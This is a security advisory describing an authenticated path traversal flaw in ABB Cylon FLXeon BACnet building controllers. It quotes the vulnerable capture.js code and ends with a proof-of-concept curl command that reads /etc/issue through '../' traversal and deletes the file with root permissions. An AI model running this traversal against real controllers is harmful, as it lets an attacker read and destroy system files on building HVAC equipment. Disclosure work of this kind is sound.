@@ -1,0 +1,93 @@
+
+ABB Cylon FLXeon 9.3.5 (capture.js) Authenticated File Disclosure/Delete
+
+
+Vendor: ABB Ltd.
+Product web page: https://www.global.abb                   
+Affected version: FLXeon Series (FBXi Series, FBTi Series, FBVi Series)
+                  CBX Series (FLX Series)
+                  CBT Series
+                  CBV Series
+                  Firmware: <=9.3.5
+
+Summary: BACnet® Smart Building Controllers. ABB's BACnet portfolio features a
+series of BACnet® IP and BACnet MS/TP field controllers for ASPECT® and INTEGRA™
+building management solutions. ABB BACnet controllers are designed for intelligent
+control of HVAC equipment such as central plant, boilers, chillers, cooling towers,
+heat pump systems, air handling units (constant volume, variable air volume, and
+multi-zone), rooftop units, electrical systems such as lighting control, variable
+frequency drives and metering.
+
+The FLXeon Controller Series uses BACnet/IP standards to deliver unprecedented
+connectivity and open integration for your building automation systems. It's scalable,
+and modular, allowing you to control a diverse range of HVAC functions.
+
+Desc: The ABB Cylon FLXeon BACnet controller is vulnerable to a path traversal flaw
+in its capture.js endpoint due to unsanitized user input being directly concatenated
+into a filesystem path. An attacker can exploit this by supplying crafted file names
+to access arbitrary files outside the intended var/ directory. Additionally, the use
+of Fs.unlinkSync() after serving the file introduces a destructive impact, allowing
+attackers to delete system or application files.
+
+------------------------------------------------------------------------------
+/api/capture.js:
+----------------
+06: function get(req, res) {
+07:     let fileName = req.params.name;
+08:     let filePath = Cylon.cylonPrefix + 'var/' + fileName;
+09:     res.download(filePath, fileName, function (err) {
+10:         Fs.unlinkSync(filePath);
+11:     });
+12: }
+------------------------------------------------------------------------------
+
+Tested on: Linux Kernel 5.4.27
+           Linux Kernel 4.15.13
+           NodeJS/8.4.0
+           Express
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2025-5934
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5934.php
+
+
+21.04.2024
+
+--
+
+
+$ cat project
+
+                 P   R   O   J   E   C   T
+
+                        .|
+                        | |
+                        |'|            ._____
+                ___    |  |            |.   |' .---"|
+        _    .-'   '-. |  |     .--'|  ||   | _|    |
+     .-'|  _.|  |    ||   '-__  |   |  |    ||      |
+     |' | |.    |    ||       | |   |  |    ||      |
+ ____|  '-'     '    ""       '-'   '-.'    '`      |____
+░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+         ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ 
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░ 
+         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░
+
+
+$ curl -k "https://7.3.3.1/api/capture:../../../../../../etc/issue" \
+> -H "Cookie: user_sid=xxx"
+# Any requested file will be deleted (with root perms) after download using Fs.unlinkSync(filePath);
